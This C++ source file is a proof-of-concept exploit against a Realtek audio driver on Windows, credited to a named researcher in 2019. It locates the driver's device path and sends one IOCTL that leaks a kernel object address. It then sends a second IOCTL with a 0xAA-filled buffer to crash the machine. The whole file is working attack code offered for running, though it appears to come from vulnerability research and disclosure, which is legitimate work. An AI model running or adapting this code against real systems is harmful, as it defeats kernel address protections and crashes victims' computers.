// Axel '0vercl0k' Souchet - 2019
#include <atlbase.h>
#include <cinttypes>
#include <cstdint>
#include <mmdeviceapi.h>
#include <optional>
#include <string>
#include <windows.h>

//
// Turn this on for debug outputs.
//

constexpr bool EnableDebugOutputs = true;

struct GuidId_t {
  GUID Guid;
  DWORD Id;
};

const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
constexpr GuidId_t
    GuidIdSpeakers = {{0xa45c254e,
                       0xdf1c,
                       0x4efd,
                       {0x80, 0x20, 0x67, 0xd1, 0x46, 0xa8, 0x50, 0xe0}},
                      2},
    GuidIdDesc = {{0xb3f8fa53,
                   0x0004,
                   0x438e,
                   {0x90, 0x03, 0x51, 0xa4, 0x6e, 0x13, 0x9b, 0xfc}},
                  6},
    GuidIdPath = {{0x233164c8,
                   0x1b2c,
                   0x4c7d,
                   {0xbc, 0x68, 0xb6, 0x71, 0x68, 0x7a, 0x25, 0x67}},
                  1};

HRESULT GetProperty(IPropertyStore *PropertyStore, const GuidId_t &GuidId,
                    PROPVARIANT &Value) {
  PROPERTYKEY Key = {};
  Key.pid = GuidId.Id;
  Key.fmtid = GuidId.Guid;
  return PropertyStore->GetValue(Key, &Value);
}

bool PropertyStringStartsWith(IPropertyStore *PropertyStore,
                              const GuidId_t &GuidId, const wchar_t *String) {
  PROPVARIANT Value;
  PropVariantInit(&Value);

  if (FAILED(GetProperty(PropertyStore, GuidId, Value)) ||
      Value.vt != VT_LPWSTR) {
    return false;
  }

  size_t StringLen = wcslen(String);
  return _wcsnicmp(String, Value.pwszVal, StringLen) == 0;
}

std::optional<std::wstring> FindDevicePath() {
  HRESULT Hr = CoInitialize(nullptr);
  if (FAILED(Hr)) {
    return std::nullopt;
  }

  CComPtr<IMMDeviceEnumerator> DeviceEnumerator;
  Hr = DeviceEnumerator.CoCreateInstance(CLSID_MMDeviceEnumerator);

  if (FAILED(Hr)) {
    return std::nullopt;
  }

  CComPtr<IMMDeviceCollection> DeviceCollection;
  Hr = DeviceEnumerator->EnumAudioEndpoints(eAll, DEVICE_STATEMASK_ALL,
                                            &DeviceCollection);

  if (FAILED(Hr)) {
    return std::nullopt;
  }

  UINT DeviceCount = 0;
  Hr = DeviceCollection->GetCount(&DeviceCount);

  if (FAILED(Hr)) {
    return std::nullopt;
  }

  for (UINT DeviceIdx = 0; DeviceIdx < DeviceCount; DeviceIdx++) {
    CComPtr<IMMDevice> Device;
    Hr = DeviceCollection->Item(DeviceIdx, &Device);

    if (FAILED(Hr)) {
      return std::nullopt;
    }

    CComPtr<IPropertyStore> PropertyStore;
    Hr = Device->OpenPropertyStore(STGM_READ, &PropertyStore);

    if (FAILED(Hr)) {
      return std::nullopt;
    }

    if constexpr (EnableDebugOutputs) {
      printf("Device %02x\n", DeviceIdx);
      DWORD PropertyCount = 0;
      PropertyStore->GetCount(&PropertyCount);
      for (DWORD PropertyIdx = 0; PropertyIdx < PropertyCount; PropertyIdx++) {
        PROPERTYKEY Key;
        PROPVARIANT Value;

        PropVariantInit(&Value);
        Hr = PropertyStore->GetAt(PropertyIdx, &Key);
        if (FAILED(Hr)) {
          continue;
        }

        Hr = PropertyStore->GetValue(Key, &Value);
        if (FAILED(Hr) || Value.vt != VT_LPWSTR) {
          continue;
        }

        printf("  {%08x-%04x-%04x-%02x-%02x-%02x-%02x-%02x-%02x-%02x-%02x "
               "(%03x)}: %S\n",
               Key.fmtid.Data1, Key.fmtid.Data2, Key.fmtid.Data3,
               Key.fmtid.Data4[0], Key.fmtid.Data4[1], Key.fmtid.Data4[2],
               Key.fmtid.Data4[3], Key.fmtid.Data4[4], Key.fmtid.Data4[5],
               Key.fmtid.Data4[6], Key.fmtid.Data4[7], Key.pid, Value.pwszVal);
      }
      printf("----\n");
    }

    const bool Match =
        (PropertyStringStartsWith(PropertyStore, GuidIdSpeakers, L"Speakers") ||
         PropertyStringStartsWith(PropertyStore, GuidIdSpeakers,
                                  L"Speaker/HP")) &&
        (PropertyStringStartsWith(PropertyStore, GuidIdDesc,
                                  L"Realtek High Definition Audio") ||
         PropertyStringStartsWith(PropertyStore, GuidIdDesc,
                                  L"Realtek(R) Audio") ||
         PropertyStringStartsWith(PropertyStore, GuidIdDesc, L"Realtek Audio"));

    if (!Match) {
      continue;
    }

    PROPVARIANT Path;
    PropVariantInit(&Path);
    if (FAILED(GetProperty(PropertyStore, GuidIdPath, Path)) ||
        Path.vt != VT_LPWSTR) {
      continue;
    }

    const wchar_t *FixedPath = Path.pwszVal;
    if (wcsstr(FixedPath, L"{2}.") == FixedPath) {
      FixedPath += 4;
    }

    HANDLE File = CreateFileW(FixedPath, GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                              OPEN_EXISTING, 0, 0);

    if (File == INVALID_HANDLE_VALUE) {
      continue;
    }

    CloseHandle(File);
    return FixedPath;
  }

  return std::nullopt;
}

std::optional<uint64_t>
LeakEventObject(HANDLE File, HANDLE EventToLeak = INVALID_HANDLE_VALUE) {

  //
  // If the event to leak is the INVALID_HANDLE_VALUE, then create one
  // ourselves.
  //

  const DWORD ObjectLeakIoctl = 0x225c0c;
  if (EventToLeak == INVALID_HANDLE_VALUE) {
    EventToLeak = CreateEventA(nullptr, true, false, "RealtekOver");
  }

  uint64_t EventKernelAddress = 0;
  DWORD Dummy = 0;
  if (!DeviceIoControl(File, ObjectLeakIoctl, &EventToLeak, sizeof(EventToLeak),
                       &EventKernelAddress, sizeof(EventKernelAddress), &Dummy,
                       nullptr)) {
    return std::nullopt;
  }

  return EventKernelAddress;
}

int main() {

  //
  // Find the driver path.
  //

  const auto &DevicePath = FindDevicePath();
  if (!DevicePath) {
    printf("Could not find a device path :(.\n");
    return EXIT_FAILURE;
  }

  //
  // Open the vulnerable device by name.
  //

  printf("Found device: %S\n", DevicePath->c_str());
  HANDLE File = CreateFileW(DevicePath->c_str(), GENERIC_READ | GENERIC_WRITE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                            OPEN_EXISTING, 0, 0);

  if (File == INVALID_HANDLE_VALUE) {
    printf("Hmm, am I getting trolled by the kernel?\n");
    return EXIT_FAILURE;
  }

  //
  // Try to leak a KEVENT object.
  //

  const auto &EventObjectAddress = LeakEventObject(File);
  if (!EventObjectAddress) {
    printf("It seems like LeakEventObject failed.\n");
    return EXIT_FAILURE;
  }

  //
  // Verify that it looks like a kernel address.
  //

  const bool IsKernelAddress = ((*EventObjectAddress >> 63) & 1) == 1;
  if (!IsKernelAddress) {
    printf("Hmm, the address doesn't look like a kernel address? (%" PRIx64
           "). Not vulnerable anymore?\n",
           *EventObjectAddress);
    return EXIT_FAILURE;
  }

  printf("Cool, sounds like it is working: %" PRIx64 ".\n",
         *EventObjectAddress);

  printf("Ready to crash? Press a key to trigger the crash or ctrl+c to stop "
         "here!\n");

  if (getchar() == EOF) {
    return EXIT_SUCCESS;
  }

  DWORD Dummy = 0;
  uint8_t Input[100] = {};
  memset(Input, 0xAA, sizeof(Input));
  uint8_t Output[15] = {};
  DeviceIoControl(File, 0x225f04, Input, sizeof(Input), nullptr, 0, &Dummy,
                  nullptr);

  printf("Sounds like you survived the crash? Is the vuln patched?\n");
  return EXIT_SUCCESS;
}